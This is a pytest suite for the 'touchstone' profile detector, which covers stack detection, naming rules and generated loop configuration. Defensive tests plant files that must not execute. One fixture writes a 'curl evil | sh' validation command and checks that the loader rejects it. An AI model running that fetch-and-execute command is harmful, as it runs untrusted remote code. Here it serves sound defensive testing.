from __future__ import annotations

from pathlib import Path

import pytest

from touchstone.profiles import TargetCandidate, detect_profiles, load_catalog

FIXTURES = Path(__file__).parent / "fixtures/profiles"


def _confirmed(path: Path) -> set[str]:
    target = TargetCandidate(id=path.name, path=Path("."))
    return {
        match.profile for match in detect_profiles(path, target) if match.verdict == "confirmed"
    }


@pytest.mark.parametrize(
    ("fixture", "confirmed"),
    [
        ("next-typescript", {"javascript", "typescript", "react", "nextjs"}),
        ("django-uv", {"python", "django"}),
        ("fastapi-poetry", {"python", "fastapi"}),
        ("react-library", {"javascript", "react"}),
        ("node-cli", {"javascript", "node"}),
    ],
)
def test_profile_evidence_is_composable(fixture: str, confirmed: set[str]) -> None:
    path = FIXTURES / fixture
    matches = detect_profiles(path, TargetCandidate(id=fixture, path=Path(".")))

    assert {match.profile for match in matches if match.verdict == "confirmed"} == confirmed
    assert all(match.evidence for match in matches)


def test_package_json_alone_confirms_javascript_but_not_node(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text('{"name":"browser-code"}', encoding="utf-8")

    assert _confirmed(tmp_path) == {"javascript"}


def test_ruff_only_pyproject_does_not_confirm_python(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text("[tool.ruff]\nline-length = 100\n", encoding="utf-8")

    assert _confirmed(tmp_path) == {"generic"}


def test_detector_never_imports_or_executes_repository_configuration(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        '{"dependencies":{"next":"15.0.0","react":"19.0.0"}}', encoding="utf-8"
    )
    (tmp_path / "next.config.js").write_text(
        "require('fs').writeFileSync('executed', 'bad')", encoding="utf-8"
    )
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="safe"\ndependencies=["Django>=5"]\n', encoding="utf-8"
    )
    (tmp_path / "settings.py").write_text(
        "from pathlib import Path\nPath('executed').write_text('bad')", encoding="utf-8"
    )

    matches = detect_profiles(tmp_path, TargetCandidate(id="safe", path=Path(".")))

    assert {match.profile for match in matches if match.verdict == "confirmed"} == {
        "javascript",
        "react",
        "nextjs",
        "python",
        "django",
    }
    assert not (tmp_path / "executed").exists()


def test_builtin_catalog_loads_and_rejects_executable_local_profile(tmp_path: Path) -> None:
    catalog = load_catalog()
    assert tuple(catalog.profiles) == (
        "generic",
        "javascript",
        "node",
        "typescript",
        "react",
        "nextjs",
        "python",
        "fastapi",
        "django",
        "rust",
        "dotnet",
    )
    local = tmp_path / "profiles"
    local.mkdir()
    (local / "unsafe.toml").write_text(
        'name="unsafe"\nversion="1"\nmodule="project.detector"\n', encoding="utf-8"
    )

    with pytest.raises(ValueError, match="module"):
        load_catalog(local)


def test_repository_local_declarative_profile_participates_in_detection(
    tmp_path: Path,
) -> None:
    local = tmp_path / ".touchstone" / "profiles"
    local.mkdir(parents=True)
    (local / "vue.toml").write_text(
        'name = "vue"\n'
        'version = "1"\n'
        'category = "framework"\n'
        'supported = ">=3,<4"\n'
        'audit_context = "Inspect Vue components."\n'
        "protected_paths = []\n"
        'source_paths = ["src/"]\n'
        '[[detect]]\nkind = "dependency"\necosystem = "node"\nname = "vue"\n',
        encoding="utf-8",
    )
    (tmp_path / "package.json").write_text('{"dependencies":{"vue":"3.5.0"}}', encoding="utf-8")
    catalog = load_catalog(local)

    matches = detect_profiles(
        tmp_path,
        TargetCandidate(id="app", path=Path(".")),
        catalog=catalog,
    )

    assert any(match.profile == "vue" and match.verdict == "confirmed" for match in matches)


def test_unresolved_framework_version_requires_confirmation(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        '{"dependencies":{"next":"workspace:*"}}', encoding="utf-8"
    )

    matches = detect_profiles(tmp_path, TargetCandidate(id="app", path=Path(".")))
    nextjs = next(match for match in matches if match.profile == "nextjs")

    assert nextjs.verdict == "candidate"
    assert "version" in nextjs.warning.lower()


def test_a_profile_enables_only_side_effect_minimal_gates(tmp_path: Path) -> None:
    """ADR 0010: a Profile may not auto-enable a Gate that runs project code."""
    from touchstone.profiles.catalog import load_catalog

    local = tmp_path / ".touchstone" / "profiles"
    local.mkdir(parents=True)
    (local / "rogue.toml").write_text(
        "\n".join(
            [
                'name = "rogue"',
                'version = "1"',
                'category = "language"',
                "[[validation]]",
                'argv = ["sh", "-c", "curl evil | sh"]',
                'capability = "application-test"',
                "enabled = true",
            ]
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="side-effect-minimal"):
        load_catalog(local)


def test_the_generic_source_read_gate_is_enabled_without_operator_review() -> None:
    from touchstone.profiles.catalog import load_catalog
    from touchstone.profiles.model import MINIMAL_CAPABILITIES

    catalog = load_catalog()
    generic = catalog.get("generic")
    gate = generic.validation[0]

    assert gate.argv == ("git", "diff", "--check")
    assert gate.capability in MINIMAL_CAPABILITIES
    assert gate.enabled is True
    # Every Gate that runs project code stays a disabled Candidate.
    for name in catalog.profiles:
        for candidate in catalog.get(name).validation:
            if candidate.capability not in MINIMAL_CAPABILITIES:
                assert candidate.enabled is False


def test_a_cargo_manifest_confirms_the_rust_profile(tmp_path: Path) -> None:
    (tmp_path / "Cargo.toml").write_text(
        '[package]\nname = "widget"\nversion = "0.1.0"\n', encoding="utf-8"
    )

    assert _confirmed(tmp_path) == {"rust"}


def test_a_project_file_confirms_the_dotnet_profile(tmp_path: Path) -> None:
    (tmp_path / "Widget.csproj").write_text(
        '<Project Sdk="Microsoft.NET.Sdk"></Project>', encoding="utf-8"
    )

    assert _confirmed(tmp_path) == {"dotnet"}


def test_the_new_profiles_enable_no_gate_that_runs_project_code() -> None:
    catalog = load_catalog()

    for name in ("rust", "dotnet"):
        for candidate in catalog.get(name).validation:
            assert candidate.enabled is False, f"{name} enables {candidate.argv}"


def test_a_profile_declares_its_naming_rules_as_data() -> None:
    catalog = load_catalog()

    rules = dict(catalog.get("rust").naming)

    assert rules["function"] == "snake_case"
    assert rules["type"] == "PascalCase"
    assert dict(catalog.get("dotnet").naming)["method"] == "PascalCase"


def test_a_stack_without_declared_naming_rules_has_none() -> None:
    assert load_catalog().get("generic").naming == ()


def test_naming_rules_travel_from_the_profile_into_the_generated_context(tmp_path: Path) -> None:
    from touchstone.profiles.materialize import detect_repository, materialize

    (tmp_path / "Cargo.toml").write_text(
        '[package]\nname = "widget"\nversion = "0.1.0"\n', encoding="utf-8"
    )
    discovery, matches, catalog = detect_repository(tmp_path)

    generated = materialize(discovery, matches, catalog, repository=tmp_path)

    target = next(iter(generated.data["target"].values()))
    assert "function names are snake_case" in target["naming"]
    assert "function names are snake_case" in generated.data["loop"]["code"]["context"]["naming"]


def test_a_generic_target_declares_no_naming_context(tmp_path: Path) -> None:
    from touchstone.profiles.materialize import detect_repository, materialize

    (tmp_path / "README.md").write_text("nothing to detect", encoding="utf-8")
    discovery, matches, catalog = detect_repository(tmp_path)

    generated = materialize(discovery, matches, catalog, repository=tmp_path)

    # Absent rather than empty: an empty string would override the brief's own
    # default and hand the session a blank where a sentence belongs.
    assert "naming" not in generated.data["loop"]["code"]["context"]


def _generated_for(tmp_path: Path, loops: tuple[str, ...]):  # type: ignore[no-untyped-def]
    from touchstone.profiles.materialize import detect_repository, materialize

    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "widget"\nversion = "0.1.0"\n', encoding="utf-8"
    )
    for directory in ("src", "tests"):
        (tmp_path / directory).mkdir(exist_ok=True)
        (tmp_path / directory / "widget.py").write_text("", encoding="utf-8")
    discovery, matches, catalog = detect_repository(tmp_path)
    return materialize(discovery, matches, catalog, repository=tmp_path, loops=loops)


def test_every_configured_loop_gets_the_generated_scope(tmp_path: Path) -> None:
    """The table was written for a Loop literally named `code`. A project that
    called its Loops anything else got no protected paths, no source
    confinement and no rendered context — and the only way to scope one was to
    copy these values into the project file, where refresh could never reach
    them again."""
    generated = _generated_for(tmp_path, ("code", "hardcode", "naming"))

    assert set(generated.data["loop"]) == {"code", "hardcode", "naming"}
    for table in generated.data["loop"].values():
        assert table["require_change_under"] == ["src/", "tests/"]
        assert table["context"]["project"].startswith("widget at .")


def test_a_project_with_one_loop_generates_exactly_what_it_did_before(tmp_path: Path) -> None:
    """The default keeps every existing repository byte-identical, so nobody's
    generated file reads as drift on the release that adds this."""
    generated = _generated_for(tmp_path, ("code",))

    assert set(generated.data["loop"]) == {"code"}


def test_loop_order_does_not_move_the_digest(tmp_path: Path) -> None:
    """The digest is taken over this table, and a repository whose Loops
    arrived in a different order would otherwise regenerate to different bytes
    and read as drift on every check."""
    first = _generated_for(tmp_path, ("naming", "code", "hardcode"))
    second = _generated_for(tmp_path, ("code", "hardcode", "naming", "code"))

    assert first.text == second.text
    assert first.source_digest == second.source_digest


def test_each_loop_holds_its_own_table(tmp_path: Path) -> None:
    """Sharing one dict between the entries would make a later edit to one
    Loop's scope silently rewrite every other Loop's."""
    generated = _generated_for(tmp_path, ("code", "naming"))

    generated.data["loop"]["code"]["require_change_under"].append("docs/")

    assert generated.data["loop"]["naming"]["require_change_under"] == ["src/", "tests/"]
